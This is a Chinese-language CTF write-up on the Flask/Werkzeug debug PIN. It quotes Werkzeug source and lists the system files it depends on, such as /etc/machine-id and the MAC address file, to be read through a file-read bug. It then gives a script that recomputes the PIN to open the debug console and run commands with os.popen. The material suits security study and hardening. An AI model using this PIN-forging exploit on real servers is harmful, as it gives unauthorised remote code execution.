# 关于 Flask Debug PIN 的安全性问题


## 0x00 前言

上周打南邮的 NCTF 时碰到了一道名为 flask_website 的题，刚开始想的是模板注入，但发现没有注入点，后来点到页面最下边的一个链接，跳转到了 Debug 模式的报错界面，从此处了解到  Flask Debug PIN 的存在，这个利用可能比较鸡肋，但倒是挺有趣的



## 0x01 Flask Debug 模式

只需要在 `app.run()` 的参数中添加 `debug=True` 即可开启 Debug 模式，此时出现错误将呈现错误信息，在报错界面可使用 `Flask Debug PIN` 直接调用 Python console ，这里只需获取 PIN 即可 getshell



## 0x02 源码分析

```python
# python所在目录/Lib/site-packages/werkzeug/debug/__init__.py

...

def get_machine_id():
    global _machine_id
    rv = _machine_id
    if rv is not None:
        return rv

    def _generate():
        # docker containers share the same machine id, get the
        # container id instead
        try:
            with open("/proc/self/cgroup") as f:
                value = f.readline()
        except IOError:
            pass
        else:
            value = value.strip().partition("/docker/")[2]

            if value:
                return value

        # Potential sources of secret information on linux.  The machine-id
        # is stable across boots, the boot id is not
        for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
            try:
                with open(filename, "rb") as f:
                    return f.readline().strip()
            except IOError:
                continue

        # On OS X we can use the computer's serial number assuming that
        # ioreg exists and can spit out that information.
        try:
            # Also catch import errors: subprocess may not be available, e.g.
            # Google App Engine
            # See https://github.com/pallets/werkzeug/issues/925
            from subprocess import Popen, PIPE

            dump = Popen(
                ["ioreg", "-c", "IOPlatformExpertDevice", "-d", "2"], stdout=PIPE
            ).communicate()[0]
            match = re.search(b'"serial-number" = <([^>]+)', dump)
            if match is not None:
                return match.group(1)
        except (OSError, ImportError):
            pass

        # On Windows we can use winreg to get the machine guid
        wr = None
        try:
            import winreg as wr
        except ImportError:
            try:
                import _winreg as wr
            except ImportError:
                pass
        if wr is not None:
            try:
                with wr.OpenKey(
                    wr.HKEY_LOCAL_MACHINE,
                    "SOFTWARE\\Microsoft\\Cryptography",
                    0,
                    wr.KEY_READ | wr.KEY_WOW64_64KEY,
                ) as rk:
                    machineGuid, wrType = wr.QueryValueEx(rk, "MachineGuid")
                    if wrType == wr.REG_SZ:
                        return machineGuid.encode("utf-8")
                    else:
                        return machineGuid
            except WindowsError:
                pass

    _machine_id = rv = _generate()
    return rv

...

def get_pin_and_cookie_name(app):
    """Given an application object this returns a semi-stable 9 digit pin
    code and a random key.  The hope is that this is stable between
    restarts to not make debugging particularly frustrating.  If the pin
    was forcefully disabled this returns `None`.

    Second item in the resulting tuple is the cookie name for remembering.
    """
    pin = os.environ.get("WERKZEUG_DEBUG_PIN")
    rv = None
    num = None

    # Pin was explicitly disabled
    if pin == "off":
        return None, None

    # Pin was provided explicitly
    if pin is not None and pin.replace("-", "").isdigit():
        # If there are separators in the pin, return it directly
        if "-" in pin:
            rv = pin
        else:
            num = pin

    modname = getattr(app, "__module__", app.__class__.__module__)

    try:
        # getuser imports the pwd module, which does not exist in Google
        # App Engine. It may also raise a KeyError if the UID does not
        # have a username, such as in Docker.
        username = getpass.getuser()
    except (ImportError, KeyError):
        username = None

    mod = sys.modules.get(modname)

    # This information only exists to make the cookie unique on the
    # computer, not as a security feature.
    probably_public_bits = [
        username,
        modname,
        getattr(app, "__name__", app.__class__.__name__),
        getattr(mod, "__file__", None),
    ]

    # This information is here to make it harder for an attacker to
    # guess the cookie name.  They are unlikely to be contained anywhere
    # within the unauthenticated debug page.
    private_bits = [str(uuid.getnode()), get_machine_id()]

    h = hashlib.md5()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, text_type):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = "__wzd" + h.hexdigest()[:20]

    # If we need to generate a pin we salt it a bit more so that we don't
    # end up with the same value and generate out 9 digits
    if num is None:
        h.update(b"pinsalt")
        num = ("%09d" % int(h.hexdigest(), 16))[:9]

    # Format the pincode in groups of digits for easier remembering if
    # we don't have a result yet.
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return rv, cookie_name
...
```

从第二个函数得知，生成 `Flask Debug PIN` 共需要六个参数

```
username  # 当前用户的用户名
modname  # flask
getattr(app, "__name__", app.__class__.__name__)  # Flask.app
getattr(mod, "__file__", None)  # flask 中 app.py 所在目录，可从报错信息中读到，一般为 python所在目录/Lib/site-packages/flask/app.py
str(uuid.getnode())  # 网卡 MAC 地址的十进制表示，Linux 可通过读取 `/sys/class/net/网卡名称（一般为 eth0 ，虚拟机为 ens33）/address` 获得 MAC 地址
get_machine_id()  # 不同环境读取不同文件
```

只需获取到这六个参数，就能生成 PIN ，从而 getshell ，其中 `machine_id` 由第一个函数获取，需要注意对应的环境读取不同的文件



## 0x03 利用过程

这里想要利用 `Flask Debug PIN` ，需要配合任意文件读取的漏洞使用，原题中使用了 urllib 库，可以通过 file 协议读取文件，获取对应参数，再从上方第二个函数中提取 PIN 的生成过程，构成如下脚本

```python
import hashlib
from itertools import chain

probably_public_bits = [
    'username',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    'python所在目录/Lib/site-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
    'MAC 地址十进制表示',  # str(uuid.getnode())，/sys/class/net/网卡名称/address
    'machine_id'  # get_machine_id()
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)

```

通过脚本生成 PIN ，在报错界面中输入即可获取 Python console ，再通过 `os.popen('xxx').readlines()` 函数即可 getshell



## 0x04 总结

此利用过程略显鸡肋，但对 Flask 的 Debug 模式 和 Flask Debug PIN 有了大致了解，可以在以后的学习过程中加以利用，达到更好的效果
